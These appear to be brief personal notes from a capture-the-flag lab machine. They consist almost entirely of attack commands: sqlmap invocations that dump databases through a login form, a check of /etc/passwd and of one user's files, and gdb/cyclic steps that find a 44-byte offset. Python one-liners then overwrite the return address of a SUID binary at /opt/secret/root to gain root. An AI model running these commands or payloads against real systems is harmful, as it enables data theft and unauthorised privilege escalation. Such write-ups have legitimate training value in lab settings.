sqlmap -u url --forms
sqlmap -u http://10.10.33.24/administrator.php --dump --data="username=admin&password=admin"  -> to get the data from the dbs

--dbs -> to get info about databases
-D databasename --tables -> to get tables in that database
-D databasename -T tablename --dump -> dump data from the table

check /etc/passwd to check whether there are accounts 

cd /
find / -user pingu 2>/dev/null

_suid file_
/opt/secret/root

gdb /opt/secret/root
r < <(cyclic 50)
cyclic -l 0x6161616c

python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
